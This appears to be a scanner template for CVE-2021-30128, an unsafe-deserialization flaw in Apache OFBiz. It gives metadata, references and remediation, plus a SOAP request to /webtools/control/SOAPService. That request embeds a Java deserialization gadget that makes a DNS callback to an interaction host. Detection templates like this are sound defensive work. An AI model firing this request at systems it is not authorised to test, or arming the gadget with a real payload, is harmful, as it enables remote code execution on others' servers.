id: CVE-2021-30128
info:
  name: Apache OFBiz <17.12.07 - Arbitrary Code Execution
  author: For3stCo1d
  description: Apache OFBiz before 17.12.07 is susceptible to arbitrary code execution
    via unsafe deserialization. An attacker can modify deserialized data or code without
    using provided accessor functions.
  severity: critical
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected system.

    '
  remediation: 'Upgrade Apache OFBiz to version 17.12.07 or later to mitigate this
    vulnerability.

    '
  reference:
  - https://lists.apache.org/thread.html/rbe8439b26a71fc3b429aa793c65dcc4a6e349bc7bb5010746a74fa1d@%3Ccommits.ofbiz.apache.org%3E
  - https://lists.apache.org/thread.html/rb3f5cd65f3ddce9b9eb4d6ea6e2919933f0f89b15953769d11003743%40%3Cdev.ofbiz.apache.org%3E
  - https://lists.apache.org/thread.html/rb3f5cd65f3ddce9b9eb4d6ea6e2919933f0f89b15953769d11003743@%3Cdev.ofbiz.apache.org%3E
  - https://nvd.nist.gov/vuln/detail/CVE-2021-30128
  - http://www.openwall.com/lists/oss-security/2021/04/27/5
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-30128
    cwe-id: CWE-502
    epss-score: 0.62199
    epss-percentile: 0.97748
    cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: apache
    product: ofbiz
    fofa-query: app="Apache_OFBiz"
  tags: cve2021,cve,apache,ofbiz,deserialization,rce
traps:
- request:
    method: POST
    path: /webtools/control/SOAPService
    headers:
      Content-Type: text/xml
    body: |
      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://ofbiz.apache.org/service/">
        <soapenv:Header/>
          <soapenv:Body>
            <ser>
              <map-Map>
                <map-Entry>
                  <map-Key>
                    <cus-obj>{{generate_java_gadget("dns", "https://{{interactsh-url}}", "hex")}}</cus-obj>
                  </map-Key>
                <map-Value>
              <std-String/>
              </map-Value>
              </map-Entry>
            </map-Map>
            </ser>
          </soapenv:Body>
      </soapenv:Envelope>
  response:
    status_code: 200
    headers: {}
    body: value="errorMessage"
